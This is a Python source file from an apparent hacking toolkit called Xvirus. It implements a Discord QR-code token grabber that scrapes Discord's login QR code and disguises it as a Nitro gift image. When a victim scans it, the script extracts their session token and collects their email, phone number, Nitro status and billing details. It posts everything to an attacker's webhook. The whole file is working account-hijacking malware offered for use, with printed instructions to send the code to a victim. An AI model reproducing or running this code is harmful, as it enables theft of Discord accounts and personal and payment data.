from util.plugins.common import * 

def QR_Grabber(Webhook):
    import os
    import random
    from PIL import Image
    import json
    import base64
    import requests
    from zipfile import ZipFile
    from time import sleep
    from urllib.request import urlretrieve
    from selenium import webdriver, common
    from bs4 import BeautifulSoup
    from colorama import Fore
    from selenium.webdriver.edge.options import Options as EdgeOptions
    from msedge.selenium_tools import Edge, EdgeOptions


    def logo_qr():
        #Paste the discord logo onto the QR code
        im1 = Image.open('QR-Code/temp_qr_code.png', 'r')
        im2 = Image.open('QR-Code/overlay.png', 'r')
        im1.paste(im2, (60, 55), im2)
        im1.save('QR-Code/Qr_Code.png', quality=95)

    def paste_template():
        #paste the finished QR code onto the nitro template
        im1 = Image.open('QR-Code/template.png', 'r')
        im2 = Image.open('QR-Code/Qr_Code.png', 'r')
        im1.paste(im2, (120, 409))
        im1.save('QR-Code/discord_gift.png', quality=95)

    opts = EdgeOptions()
    opts.use_chromium = True
    opts.add_experimental_option('excludeSwitches', ['enable-logging'])
    opts.add_experimental_option("detach", True)

    try:
        driver = Edge(options=opts, executable_path=r'assets/msedgedriver.exe')
    except common.exceptions.SessionNotCreatedException as e:
        print(f"Error: {e.msg}")
        input(f"Press ENTER to exit")
        main()
    
    driver.get('https://discord.com/login')
    sleep(3)
    page_source = driver.page_source
    soup = BeautifulSoup(page_source, features='html.parser')

    div = soup.find('div', {'class': 'qrCode-2R7t9S'})
    if div is not None:
        qr_image = div.find('img')
        if qr_image is not None:
            qr_code = qr_image['src']
            file = os.path.join(os.getcwd(), 'QR-Code/temp_qr_code.png')
            img_data = base64.b64decode(qr_code.replace('data:image/png;base64,', ''))


            with open(file, 'wb') as handler:
                handler.write(img_data)
            discord_login = driver.current_url
            logo_qr()
            paste_template()

        else:
            print("Error: QR code image not found.")
    else:
        print("Error: QR code div element not found.")

    # Download qr code templates
    urlretrieve(
        "https://github.com/Xvirus0/Xvirus-Tools/blob/main/assets/QR-Code.zip?raw=true",
        filename="QR-Code.zip",
    )
    with ZipFile("QR-Code.zip", 'r')as zip2:
        zip2.extractall()
    os.remove("QR-Code.zip")

    #remove the templates
    os.remove(os.getcwd()+"\\QR-Code\\overlay.png")
    os.remove(os.getcwd()+"\\QR-Code\\template.png")
    os.remove(os.getcwd()+"\\QR-Code\\temp_qr_code.png")
    import shutil
    shutil.move(os.getcwd()+"\\QR-Code", os.getcwd()+"\\output")
    print(f"\n{Fore.MAGENTA}[{Fore.BLUE}+{Fore.MAGENTA}]{Fore.BLUE} Information: \n")
    print(f'          Make sure to have this window open to grab their token!\n')
    print(f'          Send the QR Code to a user and wait for them to scan!\n')
    print(f'          QR Code generated in '+os.getcwd()+'\\output\\QR-Code')
    os.system(f'start {os.path.realpath(os.getcwd()+"/output/QR-Code")}')

    #Waiting for them to scan QR code
    while True:
        if discord_login != driver.current_url:
            token = driver.execute_script('''
    token = (webpackChunkdiscord_app.push([
        [''],
        {},
        e=>{m=[];for(
                let c in e.c)
                m.push(e.c[c])}
        ]),m)
        .find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
    return token;
                ''')
            j = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)).json()
            badges = ""
            flags = j['flags']
            if (flags == 1): badges += "Staff, "
            if (flags == 2): badges += "Partner, "
            if (flags == 4): badges += "Hypesquad Event, "
            if (flags == 8): badges += "Green Bughunter, "
            if (flags == 64): badges += "Hypesquad Bravery, "
            if (flags == 128): badges += "HypeSquad Brillance, "
            if (flags == 256): badges += "HypeSquad Balance, "
            if (flags == 512): badges += "Early Supporter, "
            if (flags == 16384): badges += "Gold BugHunter, "
            if (flags == 131072): badges += "Verified Bot Developer, "
            if (badges == ""): badges = "None"
            user = j["username"] + "#" + str(j["discriminator"])
            email = j["email"]
            phone = j["phone"] if j["phone"] else "No Phone Number attached"
            url = f'https://cdn.discordapp.com/avatars/{j["id"]}/{j["avatar"]}.gif'
            try:
                requests.get(url)
            except:
                url = url[:-4]
            nitro_data = requests.get('https://discord.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token)).json()
            has_nitro = False
            has_nitro = bool(len(nitro_data) > 0)
            billing = bool(len(json.loads(requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token)).text)) > 0)
            embed = {
                "avatar_url":"https://i.gifer.com/9aRS.gif",
                "embeds": [
                    {
                       'author': {
                        'name': f'{Victim} Just ran Xvirus Token Grabber',
                        'url': 'https://github.com/Xvirus0/Xvirus-Tools',
                        'icon_url': 'https://media.tenor.com/KMKul6qRN_oAAAAC/coral-growth-houdini.gif'
                        },
                        "description": f"**{user}** Just Scanned the QR code\n\n**Has Billing:** {billing}\n**Nitro:** {has_nitro}\n**Badges:** {badges}\n**Email:** {email}\n**Phone:** {phone}\n**[Avatar]({url})**",
                        "fields": [
                            {
                            "name": "**Token**",
                            "value": f"```fix\n{token}```",
                            "inline": False
                            }
                        ],
                        "color": 8388736,
                        "footer": {
                        'text': 'Xvirus grabber・By Xvirus・https://github.com/Xvirus0/Xvirus-Tool'
                        }
                    }
                ]
            }
            requests.post(Webhook, json=embed)
            sublime(token, "Fake QR Code")
            break
    input(f"\nPress ENTER to exit")
    main()
